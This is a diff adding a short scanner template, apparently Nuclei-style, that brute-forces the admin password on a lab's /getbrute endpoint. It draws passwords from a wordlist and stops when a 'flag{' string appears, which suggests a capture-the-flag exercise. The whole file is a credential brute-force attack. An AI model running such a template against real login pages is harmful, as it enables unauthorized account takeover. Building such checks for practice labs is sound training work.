@@ -1,0 +1,29 @@
+id: get_brute
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct get_brute 
+
+http:
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+      
+    - |
+      GET /getbrute?username=admin&password={{pass}} HTTP/2
+      Host: {{Hostname}}
+    
+    payloads:
+      pass: ./pass
+
+    stop-at-first-match: true
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag{"
+    attack: batteringram
